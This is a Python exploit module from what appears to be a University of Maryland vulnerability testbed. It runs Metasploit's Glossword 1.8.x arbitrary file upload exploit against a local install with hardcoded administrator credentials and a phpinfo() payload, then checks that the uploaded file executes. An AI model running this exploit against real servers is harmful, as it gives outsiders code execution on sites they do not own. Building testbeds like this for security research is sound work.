
# Copyright 2013 University of Maryland.  All rights reserved.
# Use of this source code is governed by a BSD-style
# license that can be found in the LICENSE.TXT file.


import sys
import os
import urllib2
import re

import selenium.common.exceptions
import framework
import subprocess

class Exploit (framework.Exploit):
    # Note exploit fails in glossword_upload_exec.rb if res.code is checked ~ Line150
    # Had to change check to 200 instead of 301

    attributes = {'Name' :        "OSVDB_89960",
                  'Description' : "Glossword v1.8.8 - 1.8.12 Arbitrary File Upload Vulnerability"
                                  "This application has an upload feature that allows an authenticated user"
		  		  "with administrator roles to upload arbitrary files to /gw_temp/a/ .",
                  'References' :  [['OSVDB', '89960']],
                  'Target' :      "Glossword 1.8.12",
                  'TargetLicense' : '',
                  'VulWikiPage' : "",
                  'Type' : 'EXEC'
                  }

    def __init__(self, visible=False):
        framework.Exploit.__init__(self, visible)
        self.msf_out = ""
        return

    def exploit(self):
        self.logger.info("Running Metasploit")
                
        metasploit_cmd = "framework/Exploits/metasploit-framework/msfcli multi/http/glossword_upload_exec " \
                         "RHOST=127.0.0.1 TARGETURI=/glossword/1.8/ USERNAME=dict-contrib PASSWORD=contribpw21 " \
                         "PAYLOAD=generic/custom PAYLOADSTR=\'phpinfo();\' E"
       
        proc = subprocess.Popen(metasploit_cmd, stdout=subprocess.PIPE, shell=True)
        (self.msf_out, err) = proc.communicate()
        self.logger.info(self.msf_out)


        self.logger.info("Done! Browse to the payload at http://127.0.0.1/glossword/1.8/[tmpdir] where [tmpdir] is the url shown by Metasploit")
        return


    def verify(self):
        recomp = re.compile('.*Found payload file path \((.+)\).*', re.MULTILINE)
        path = recomp.findall(self.msf_out)
        
        if(len(path) != 1):
            return False

        self.logger.info("Checking payload at http://127.0.0.1/glossword/1.8/%s", path[0])
        
        try:
            response = urllib2.urlopen("http://127.0.0.1/glossword/1.8/%s" % (path[0],))
            html = response.read()
        except IOError:
            self.logger.error("IOError: unable to open url")
            return False

        if(html.find("PHP Logo") != -1):
            self.logger.info("payload confirmed")
            return True

        self.logger.info("payload not found")
        return False
